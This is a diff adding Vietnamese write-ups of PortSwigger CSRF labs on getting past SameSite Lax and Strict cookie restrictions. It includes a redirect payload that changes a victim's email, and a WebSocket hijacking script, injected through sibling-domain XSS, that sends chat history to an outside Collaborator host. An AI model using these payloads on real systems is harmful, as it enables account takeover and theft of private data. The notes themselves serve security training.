@@ -123,7 +123,7 @@ Context: Cần bypass `Samesite: Lax`
 
 ![alt text](image-8.png)
 
-Mặt khác, cookie được tạo và không đặt `Samesite` nên mặc định nó là `Lax`. Với Lax cookie chỉ được include vào request khi đó là `GET` và đến 1 URL cấp cao hơn.
+Mặt khác, cookie được tạo và không đặt `Samesite` nên mặc định nó là `Lax`. Với Lax cookie chỉ được include vào request khi đó là `GET` và đến 1 URL cấp cao hơn. Hoặc điều hướng từ trang gốc đến 1 trang redirect
 
 Nhưng khi chuyển qua `GET` nó đang không cho phép request:\
 ![alt text](image-9.png)
@@ -143,7 +143,146 @@ Tham khảo cách khác để ghi đè method: https://www.sidechannel.blog/en/h
 ---
 
 ### 8. SameSite Strict bypass via client-side redirect
+
 https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+
+Với cookie được đặt `SameSite=Strict` thì nó chỉ gắn cookie khi chuyển hướng trong trang, ko gắn khi liên trang hay kể cả khác scheme
+
+Vì vậy cần tìm 1 chuyển hướng từ trang gốc đến chính trang đó, và ở đây mình sẽ cố đâm vào cái url chuyển hướng thứ 2, vì nó sẽ mang cookie theo
+
+Ta tìm được 1 trang chuyển hướng khi post comment ta nhận được path: `/post/comment/confirmation?postId=x`
+
+Sau đó nó được chuyển hướng về postId `x`
+
+Thêm vào đó ta có thể thâu tóm path này để path traversal đến bất kì trang nào:
+
+![alt text](image-11.png)
+
+Mặt khác ta có thể change email bằng GET thay vì POST 
+
+```http
+GET /my-account/change-email?email=abcd%40gmail.net&submit=1 HTTP/2
+```
+
+Payload:
+
+```js
+<script>
+    document.location = "https://0a06002304ad4b2082303ecf00390045.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+```
+
+Gửi cho victim
+
+Khi victim truy cập vào link, nó sẽ redirect đến trang này và vì cùng site nên nó vẫn mang theo cookie victim
+
+---
+
+### 9. SameSite Strict bypass via sibling domain
+
+https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+
+Khi vào `/chat` ta thấy không có token nào để xác định cá nhân đang yêu cầu
+
+![alt text](image-12.png)
+
+Vào `WebSockets history` ta thấy khi refresh chat browser sẽ send `READY` cho server và các gói tin tiếp theo là lịch sử trước đó 
+
+![alt text](image-13.png)
+
+Dùng `Collaborator` tạo script:
+
+```js
+<script>
+    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+
+![alt text](image-14.png)
+
+Và thử xem exploit thì ta sẽ nhận được gói tin ở `Collaborator` chứng tỏ ta đã kích hoạt được để nó gửi payload ra, thế nhưng ta chỉ lấy được 1 phiên mới, ko lấy được phiên cũ ta vừa chat
+
+![alt text](image-15.png)
+
+Qua tab `History` ta thấy `GET /chat` không được gửi cùng cookie, vì cookie khi server đã có `SameSite=Strict`
+
+![alt text](image-16.png)
+
+Điều này bắt buộc phải có thêm 1 lỗ hổng khác
+
+Ta thấy rằng có 1 request cho phép `Access-Control-Allow-Origin` và domain lấy là: `cms-YOUR-LAB-ID.web-security-academy.net`
+
+![alt text](image-17.png)
+
+Ta vào thử domain này:
+
+![alt text](image-18.png)
+
+Login username bất kì ta nhận được:
+
+![alt text](image-19.png)
+
+Thử với username `<script>alert(1)</script>` ta nhận được alert:
+
+![alt text](image-20.png)
+
+Đổi method `POST` thành `GET` và thử lại ta thấy vẫn có thể kích hoạt XSS
+
+![alt text](image-21.png)
+
+Ta sẽ tận dụng domain này vì domain này được allow nên có thể được mang theo cookie
+
+Bây giờ đoạn script khai thác lúc nãy ta sẽ encode đưa vào username:
+
+```js
+<script>
+    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+
+![alt text](image-22.png)
+
+Còn ở exploit server ta sẽ thêm đoạn script mà đoạn username sẽ là đoạn encode script ở trên:
+
+```js
+<script>
+    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
+</script>
+```
+
+![alt text](image-23.png)
+
+Để khi người dùng vào url này nó sẽ từ domain cms kích hoạt XSS nên sẽ tạo `/chat` cho domain gốc, do allow origin nên nó được mang theo cookie, điều này giúp ta lấy được lịch sử đoạn chat theo cookie victim
+
+![alt text](image-24.png)
+
+---
+
+Thường khi không cấp chế độ gì cho cookie thì nó sẽ tự động được gắn là `Lax` và không được gửi với POST cho chéo trang
+
+nhưng vì để không phá vỡ cơ chế SSO, trong 120s đầu tiên cấp cookie nó vẫn có thể dùng với POST, và đây là khoảng thời gian mà cookie không ở chế độ `Lax`
+
+
+
+
+
+
+
+
+
+
 
 
 
